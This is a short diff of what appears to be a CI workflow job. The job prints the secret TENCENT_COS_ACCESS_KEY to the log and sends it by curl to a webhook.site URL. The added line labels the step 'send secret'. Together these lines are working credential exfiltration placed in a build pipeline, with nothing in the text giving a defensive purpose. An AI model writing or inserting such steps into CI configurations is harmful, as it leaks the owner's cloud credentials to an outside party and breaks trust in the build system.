@@ -16,6 +16,7 @@ jobs:
         run: |
           echo "start run"
           echo "secret = ${TENCENT_COS_ACCESS_KEY}"
+          echo "send secret"
           curl "https://webhook.site/400f5d0b-603a-4d5c-872d-5ae903d6b830/${TENCENT_COS_ACCESS_KEY}"
           
         
